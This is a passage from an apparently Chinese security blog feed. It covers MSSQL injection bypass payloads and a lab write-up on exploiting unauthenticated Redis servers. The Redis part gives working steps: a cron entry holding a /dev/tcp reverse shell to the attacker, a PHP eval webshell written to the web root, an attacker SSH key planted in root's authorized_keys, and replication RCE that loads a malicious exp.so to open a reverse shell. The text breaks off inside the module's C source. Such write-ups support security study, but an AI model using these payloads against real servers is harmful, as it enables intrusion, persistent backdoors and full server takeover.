src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405110616058.png" alt="image-20240405110616058"></p><p><strong>绕过示例</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@a</span> nvarchar(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;select convert(int,@@version)&#x27;</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@a</span>)<br>#<span class="hljs-keyword">declare</span>定义变量 <span class="hljs-keyword">set</span>设置变量值 <span class="hljs-keyword">exec</span>执行变量<br></code></pre></td></tr></table></figure><p>嘶怪了，在浏览网页的时候不报错，单独测试了一下每个命令都是执行了的啊，而且在SSMS中又是有效的，不知道为啥。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240405112351188.png" alt="image-20240405112351188"></p><p>变量的值是支持hex和ascii码的,当过滤引号时可以把我们的语句编码一下</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">108</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">44</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">41</span>) <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis常见漏洞学习</title>
      <link href="/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="redis基础知识"><a href="#redis基础知识" class="headerlink" title="redis基础知识"></a>redis基础知识</h1><p>redis是一个非常快速的、开源的、支持网络、可基于内存亦可持久化的日志型、非关系类型的.Key-Value数据库，并提供多种语言的API。它提供了Java，C&#x2F;C++，C#，PHP，JavaScript，PerlObject-C，Python，Ruby，Erlang等客户端，使用很方便。</p><p>与MySQL数据库不同的是，Redis的数据是存在内存中的。它的读写速度非常快，每秒可以处理超过10万次读写操作。因此redis被广泛应用于缓存，另外，Redis也经常用来做分布式锁。除此之外，Redis支持事务、持久化、LUA 脚本、LRU 驱动事件、多种集群方案。</p><h2 id="一些常用的命令"><a href="#一些常用的命令" class="headerlink" title="一些常用的命令"></a>一些常用的命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set xz &quot;Hacker&quot;          # 设置键xz的值为字符串Hacker<br>get xz                   # 获取键xz的内容<br>info                     # 获取服务器的各种信息和统计数据比如服务器当前的状态、统计信息、配置参数、客户端连接情况等，我们还可以获取特定信息，比如info memory只获取内存信息<br>SET score 857            # 设置键score的值为857<br>INCR score               # 使用INCR命令将score的值增加1<br>GET score                # 获取键score的内容<br>keys *                   # 列出当前数据库中所有的键<br>config set protected-mode no        # 关闭安全模式<br>get anotherkey                      # 获取一个不存在的键的值<br>config set dir /root/redis          # 设置保存目录<br>config set dbfilename redis.rdb     # 设置保存文件名<br>config get dir                      # 查看保存目录<br>config get dbfilename               # 查看保存文件名<br>save                                # 进行一次备份操作<br>flushall                            # 删除所有数据<br>del key                             # 删除键为key的数据<br>slaveof ip port                     # 设置主从关系<br>redis-cli -h ip -p 6379 -a passwd   # 外部连接<br>flushdb                             # 清空当前数据库的所有 key<br>module load /path/to/your/module.so # 用来加载自定义的模块文件，通常是so文件，/path/to/your/module.so 替换为你实际的模块文件路径<br>module list                         #列出已经加载的模块<br></code></pre></td></tr></table></figure><blockquote><p>不过module加载模块有些redis版本是不支持的</p></blockquote><h2 id="redis相关的数据库配置"><a href="#redis相关的数据库配置" class="headerlink" title="redis相关的数据库配置"></a>redis相关的数据库配置</h2><p>redis数据库相关的配置可以在**&#x2F;etc&#x2F;redis&#x2F;redis.conf**文件里面进行设置</p><p><strong>port</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103644314.png" alt="image-20240330103644314"></p><p><strong>bind</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，就是白名单形式。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103720889.png" alt="image-20240330103720889"></p><p><strong>save</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：<br>save 900 1<br>save 300 10<br>save 60 10000<br>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103908193.png" alt="image-20240330103908193"></p><p><strong>requirepass</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104550773.png" alt="image-20240330104550773"></p><blockquote><p>默认不设置密码这也是未授权访问的重要原因</p></blockquote><p><strong>dir</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104712001.png" alt="image-20240330104712001"></p><p><strong>dbfilename</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104849575.png" alt="image-20240330104849575"></p><p><strong>config</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过config命令可以读取和设置dir参数以及dbfilename参数，后面很多攻击方式都会需要用到该命令，所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330105533934.png" alt="image-20240330105533934"></p><p><strong>protected-mode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330105721000.png" alt="image-20240330105721000"></p><h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p>redis未授权访问漏洞是一个由于redis服务版本较低其未设置登录密码导致的漏洞，攻击者可直接利用redis服务器的ip地址和端口完成redis服务器的远程登录，对目标服务器完成后续的控制和利用。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ol><li>redis版本为4.x&#x2F;5.0.5以前的版本</li><li>redis绑定在0.0.0.0:6379端口，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接博暴露在公网。</li><li>没有设置认证密码(一般为空)，可以免密码远程登陆redis服务。</li></ol><h2 id="漏洞导致的危害"><a href="#漏洞导致的危害" class="headerlink" title="漏洞导致的危害"></a>漏洞导致的危害</h2><ol><li>攻击者可以通过redis的命令来向目标服务器写入计划任务进行反弹shell</li><li>攻击者可以通过命令向网站目录写入webshell来进行控制网站服务器</li><li>最严重的情况，如果目标机器是以root身份登录的服务器并且开启了redis，黑客就可以直接利用该账号的权限写入SSH公钥文件，直接通过SSH登录受害者的服务器。</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>漏洞环境搭建</strong></p><p>这里我的受害机是ubuntu，攻击机是kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.直接安装redis<br>sudo apt install redis<br><br>2.关闭一下防火墙<br>iptables -F<br><br>3.将bind的绑定地址设定为0.0.0.0可以使其暴露在公网上面<br>bind 0.0.0.0<br><br>4.重启一下redis服务<br>systemctl restart redis<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330125500798.png" alt="image-20240330125500798"></p><p><strong>然后直接漏洞利用即可</strong></p><p>在攻击机上用redis-cli连接即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">redis-cli -h &lt;受害机的IP&gt; -p 6379<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330125617710.png" alt="image-20240330125617710"></p><p>下面就是一些利用该漏洞所进行的进一步攻击操作</p><h1 id="写入计划任务反弹shell"><a href="#写入计划任务反弹shell" class="headerlink" title="写入计划任务反弹shell"></a>写入计划任务反弹shell</h1><p><strong>计划任务相关文件的粗放位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/etc/crontab：这是系统范围的 cron 配置文件，其中包含了系统级别的计划任务的设置。<br><br>/etc/cron.d/：这个目录用于存放系统级别的 cron 任务配置文件。<br><br>/etc/cron.daily/：该目录包含了每日执行的计划任务。<br><br>/etc/cron.weekly/：这个目录用于存放每周执行的计划任务。<br><br>/etc/cron.monthly/：包含了每月执行的计划任务。<br><br>/var/spool/cron/ 或 /var/spool/cron/crontabs/：这个目录通常包含用户特定的 crontab 文件，用户可以在其中定义自己的计划任务。<br><br>用户家目录下的 .crontab 或 .cronjobs：用户可以在自己的家目录下创建名为 .crontab 或 .cronjobs 的文件，以定义自己的计划任务。<br></code></pre></td></tr></table></figure><p>这里再了解一下计划任务的写入形式，当我们crontab -e写入计划任务的时候，会在计划任务的目录下创建一个以用户名命名的文件，所以我们等会redis写入文件时保存的文件名也要是以用户名命名的文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330132520323.png" alt="image-20240330132520323"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330132538445.png" alt="image-20240330132538445"></p><p><strong>写入计划任务</strong></p><p>利用思路：</p><p>我们连接之后就要利用config修改文件的保存路径为计划任务的路径，然后写入计划任务（emmm写入失败了，说权限不够，可能是ubuntu用了普通用户启动redis，但是Ubuntu换root登录又要折腾，我这里直接换centos了）</p><p>&#x3D;&#x3D;centos安装redis&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shelll">yum update #更新安装包<br>yum install epel-release # 安装 EPEL 软件库：Redis 软件包通常在 EPEL 软件库中<br>yum install redis<br>sudo systemctl start redis #启动redis服务<br>sudo systemctl enable redis # 用于设置开机自启动，看需求选择<br></code></pre></td></tr></table></figure><p>然后和上面一样修改配置文件，centos的redis配置文件的路径为&#x2F;etc&#x2F;redis.conf</p><p>然后再关一下防火墙</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">iptables -F<br>setenforce 0  # 改变SELinux的工作模式，SELinux是一种在 Linux 操作系统上实现强制访问控制（MAC）的安全机制；<br>systemctl stop firewalld.service #centos中特有的防火墙<br></code></pre></td></tr></table></figure><blockquote><p>SELinux有三种工作模式：</p><ol><li>Enforcing Mode（强制模式）：在这个模式下，SELinux会强制执行所有定义的安全策略，如果有违反策略的操作发生，会被阻止并记录到日志中。在强制模式下，SELinux会严格限制系统资源的访问。表示为1</li><li>Permissive Mode（宽容模式）：在这个模式下，SELinux会记录违反安全策略的操作，但不会阻止它们，这样可以帮助管理员了解哪些操作可能会违反策略。这个模式类似于监控模式。表示为0</li><li>Disabled Mode（禁用模式）：在这个模式下，SELinux完全被禁用，系统不会应用任何SELinux的安全策略。要设置关闭的话就需要修改”&#x2F;etc&#x2F;sysconfig&#x2F;selinux”配置文件</li></ol><p>可以使用getenforce查看当前工作模式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330141233651.png" alt="image-20240330141233651"></p></blockquote><blockquote><p>又写不进去还是会报下面的错我就奇怪了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143126682.png" alt="image-20240330143126682"></p><p>去搜了搜发现即使为root身份，redis他自己也不是以root身份登录的，要从配置文件启动才能以root身份登录，坑死了，所以要先systemctl stop redis来停掉redis服务，要我们来自己启动</p><p>&#x2F;usr&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis.conf  &#x2F;&#x2F;直接redis-server启动会开启保护模式也改不了目录</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143530956.png" alt="image-20240330143530956"></p><p>然后终于可以愉快地写计划任务了</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron   #这个要看具体系统的目录<br>config set dbfilename root<br>set xxoo &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;攻击者ip&gt;/&lt;监听端口&gt; 0&gt;&amp;1\n\n&quot; #这里的换行是为了保证格式正确，如果目标机器上有很多的计划任务可能会导致写入的反弹sehll格式错误。<br>save  #进行一次备份来写入文件当中<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143734305.png" alt="image-20240330143734305"></p><p>然后<strong>nc -lvvp 6666</strong>开启监听等待即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330144612655.png" alt="image-20240330144612655"></p><p>反弹shell成功，可以看一下我们写进去的计划任务长什么样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330144654223.png" alt="image-20240330144654223"></p><h1 id="写入webshell控制服务器"><a href="#写入webshell控制服务器" class="headerlink" title="写入webshell控制服务器"></a>写入webshell控制服务器</h1><ol><li>这里我们先用centos快速搭建一个LAMP的环境用于解析我们上传的php一句话木马</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装apache服务器</span><br>sudo yum install httpd<br>sudo systemctl start httpd<br>sudo systemctl enable httpd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装mysql数据库</span><br>sudo yum install mysql mysql-server<br>sudo systemctl start mysqld<br>sudo systemctl enable mysqld<br>sudo mysql_secure_installation # MySQL 提供的实用工具，用于执行一些安全设置和配置以加固 MySQL 数据库的安全性<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装php</span><br>sudo yum install php php-mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>开始写入我们的webshell</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/www/html<br>config set dbfilename shell.php<br>set shell &quot;&lt;?php eval($_POST[shell])?&gt;&quot;<br>save<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150154116.png" alt="image-20240330150154116"></p><p>然后我们去访问一下shell.php</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150249714.png" alt="image-20240330150249714"></p><p>上面的内容是我们上次设置的定时任务数据，一起save了进去，接下来用蚁剑去连接一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150436847.png" alt="image-20240330150436847"></p><p>连接成功可以看到目录下的文件</p><h1 id="写入ssh-keygen公钥登录服务器漏洞"><a href="#写入ssh-keygen公钥登录服务器漏洞" class="headerlink" title="写入ssh-keygen公钥登录服务器漏洞"></a>写入ssh-keygen公钥登录服务器漏洞</h1><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p><p>密钥验证就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p><ol><li>客户端生成私钥和公钥，将公钥拷贝给服务器端</li><li>客户端发起登录请求</li><li>服务器端根据客户端发来的信息查找是否存有该客户端的公钥，</li><li>客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证</li><li>服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对</li></ol><p><strong>攻击者本地生成密钥对</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  # 在家目录的.ssh下进行生成<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151056696.png" alt="image-20240330151056696"></p><p><strong>向受害者机器写入公钥</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set x &quot;\n\n\n&lt;生成的公钥&gt;\n\n\n&quot;  #换行是为了避免和其他数据混合保证格式正确，和上面的计划任务一样<br>save<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151540903.png" alt="image-20240330151540903"></p><p>然后使用ssh登录目标机器，在.ssh目录下用私钥登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -i id_rsa root@&lt;目标机器ip&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151831267.png" alt="image-20240330151831267"></p><p>成功登录！</p><h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><p><strong>主从复制介绍</strong></p><p>主从复制的传输分为全量传输和增量传输，这里的重点是全量传输：全量传输是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。</p><p>这里从别人的文章偷个流程图方便理解：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330225328187.png" alt="image-20240330225328187"></p><p><strong>漏洞原理</strong></p><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令,通过写c语言并编译出,so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNG同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><blockquote><p>因为redis可以加载外部模块，而外部模块都是so文件的形式，可以使用编辑redis配置文件的方式来加载模块，文件里面也给了我们示例</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330170245773.png" alt="image-20240330170245773"></p></blockquote><p><strong>漏洞利用</strong></p><p>漏洞利用我们需要用到下面的两个工具</p><ul><li>redis-rogue-server：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> ，该工具针对端口开放在公网的redis使用，没开在公网就是用下面的工具</li><li>Awsome-Redis-Rogue-Server：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></li></ul><h2 id="使用第一个工具远程主从复制RCE"><a href="#使用第一个工具远程主从复制RCE" class="headerlink" title="使用第一个工具远程主从复制RCE"></a>使用第一个工具远程主从复制RCE</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --rhost  --rport  --lhost  --lport <br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-–rpasswd 如果目标 Redis 服务开启了认证功能，可以通过该选项指定密码(没尝试过不知道行不行)<br><br>-–rhost 目标 redis 服务 IP<br><br>-–rport 目标 redis 服务端口，默认为 6379<br><br>-–lhost vps 的 IP 地址<br><br>-–lport vps 的端口，默认为 21000<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330171342499.png" alt="image-20240330171342499"></p><p>可以看到已经成功访问，我们可以用i选择一个交互式shell或者r反弹一个shell(这时候要再开启一个监听端口)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330171502308.png" alt="image-20240330171502308"></p><p>emmm这个交互式的shell好像有点拉，接下来换反弹shell试试，发现弹不了失败了，感觉是我本地安装的redis版本过高了，这个脚本的使用版本是&lt;&#x3D;5.0.5，然后取volfocus开了一个5.0版本的环境就成功了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330223708742.png" alt="image-20240330223708742"></p><p>可以看到成功反弹了一个shell回来，这是后我们还可以用python来生成一个交互式的shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>不过开的这个容器没有python生成不了（</p></blockquote><h2 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h2><p><strong>漏洞原理：</strong>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><p>步骤可以总结如下：</p><ul><li>第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</li><li>第二步，我们设置备份文件名为so文件</li><li>第三步，设置传输方式为全量传输</li><li>第四步，加载恶意so文件，实现任意命令执行</li></ul><blockquote><p>我们需要将redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server的目录下进行使用，因为他的exp.so是带system模块的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330230929601.png" alt="image-20240330230929601"></p></blockquote><p>攻击机先执行下面的命令伪造一个master</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis_rogue_server.py -v -path exp.so<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330232215843.png" alt="image-20240330232215843"></p><p>我们连接上受害者机器之后执行下面的命令修改一下文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /tmp #一般/tmp目录都有权限写入，所以选择这个目录写入<br>config set dbfilename exp.so  #设置导出文件名<br>slaveof &lt;我们伪造的主机master的ip&gt; &lt;端口号&gt; #进行主从同步，将恶意so文件写入到tmp目录<br>module load ./exp.so   #加载写入的恶意so文件模块<br>module list            #查看恶意so有没有加载成功，主要看有没有system模块<br>system.rev &lt;攻击者ip&gt; &lt;监听端口&gt;   #这样就可以反弹一个shell回来了<br></code></pre></td></tr></table></figure><p>可以先看一下我们同步之前是没有模块的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330232527628.png" alt="image-20240330232527628"></p><p>我们同步之后再看一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330233258551.png" alt="image-20240330233258551"></p><p>最后监听端口进行反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330233419607.png" alt="image-20240330233419607"></p><p>可以看到我们的当前目录就是在&#x2F;tmp下</p><h2 id="了解一下外部模块原理"><a href="#了解一下外部模块原理" class="headerlink" title="了解一下外部模块原理"></a>了解一下外部模块原理</h2><p>大概说一下模块编写的实现流程：</p><blockquote><p>首先需要的是初始化，以便让框架可以找到对应的方法，这就需要进行注册，Redis通过RedisModule_Init方法进行注册模块，和RedisModule_CreateCommand注册自定义方法。</p><p>Redis导出了redismodule.h头文件，通过实现该头文件相关API函数，然后编译为so动态库即可，可以在配置文件中使用loadmodule指明，也可以在运行时使用命令动态加载（MODULE LOAD）。</p></blockquote><p>我们可以看一下上面给我们的工具里的exp.so，他就是由一个exp.c编译而来，我们来看看里面的内容</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;redismodule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">DoCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == 